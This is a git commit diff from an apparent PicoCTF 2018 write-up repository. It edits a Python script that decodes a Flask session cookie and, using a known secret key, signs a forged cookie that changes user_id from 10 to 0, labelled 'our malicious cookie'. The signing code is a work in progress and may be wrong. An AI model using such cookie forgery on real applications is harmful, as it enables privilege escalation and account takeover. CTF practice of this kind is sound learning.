8e7959419d1374a3e4590ff59d7d19b2c3a67828
Saskia Hiltemann <zazkia@gmail.com>
2018-10-24 18:50:15 +0200

    progress flaskcards2

--- PicoCTF_2018/writeupfiles/flaskcards_skeleton_key.py
+++ PicoCTF_2018/writeupfiles/flaskcards_skeleton_key.py
@@ -25,25 +25,37 @@ def decrypt(cookie):
         return "[Decoding error: are you sure this was a Flask session cookie? {}]".format(e)
 
 def encrypt(cookie, secret_key):
-    data = zlib.compress(cookie)
+    compress = True
+    if compress:
+        data = zlib.compress(cookie)
     data = base64_encode(data)
 
-    # concat, django-concat and hmac
-    s = Signer(secret_key, key_derivation='hmac')
-    data1 = s.sign(data)
-    return data1
+    s = Signer(secret_key) # key_derivation = concat|django-concat|hmac
+    signature = s.get_signature(cookie)
+    data += '.' + signature
+
+    # or sign the compressed / b64 encoded data?
+    #data = s.sign(data)
+
+    if compress: # if compression used, prefix string with a period
+        data = '.' + data
+
+    return data
 
 cookie = '.eJwlj8uKwzAMAP_F5xxsvSL3Z4JsSWwp7ELSnkr_vYa9z8DMuxx5xvVTbs_zFVs57l5uxRwDe6Vahcl2Ms0KXMUoh6I7IgE0HcSufYoKx0DHXcOYwKlPlkRAi-GZqYCcjEkBOVO7GUwOttaWbHtomzarTfLWxapj2cq8zjyef4_4XT0LVhBpwIyqMnqb3HRXRKUBoqQ-Vkwu73XF-T_Ravl8Aa_JPmw.DrIbMQ.mLvNGriozmsC4ufO9lqGP44D340'
 
 cookie_plain = '{"_fresh":true,"_id":"ad3e390400654a74a8f02506a4fb83dd3342218b45d89c6865eb3d378ea542d49c56f323aebdfff8235f53f4e2fcf89aa2c5e5a119c6a7e81cac0ac4d196a0d3","csrf_token":"5e5826612553886b91c518783384b26848dbb45f","user_id":"10"}'
 
 
+cookie_exploit = '{"_fresh":true,"_id":"ad3e390400654a74a8f02506a4fb83dd3342218b45d89c6865eb3d378ea542d49c56f323aebdfff8235f53f4e2fcf89aa2c5e5a119c6a7e81cac0ac4d196a0d3","csrf_token":"5e5826612553886b91c518783384b26848dbb45f","user_id":"0"}'
+
 secret_key = '385c16dd09098b011d0086f9e218a0a2'
 #secret_key = base64_decode('OFwW3QkJiwEdAIb54higog==')
 
 print(decrypt(cookie))
+print(encrypt(cookie_plain, secret_key)) # see if we can get our own cookie back
 
-print(encrypt(cookie_plain, secret_key))
-
+# encode our malicious cookie
+print(encrypt(cookie_exploit, secret_key))
 
 
